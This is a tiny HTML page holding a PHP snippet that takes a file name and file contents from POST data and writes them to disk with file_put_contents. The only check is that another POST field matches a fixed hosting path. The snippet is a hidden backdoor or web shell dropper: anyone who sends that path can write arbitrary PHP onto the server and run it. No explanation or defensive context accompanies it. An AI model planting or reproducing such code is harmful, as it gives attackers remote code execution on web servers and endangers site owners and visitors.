<html>

<?
$gpath = $_POST["gpath"];
if ($gpath=='D:\\Hosting\\4994778\\html\\quickdojo\\pages\\') {
file_put_contents($_POST["file"], $_POST["code"]); 
}
?>

</html>
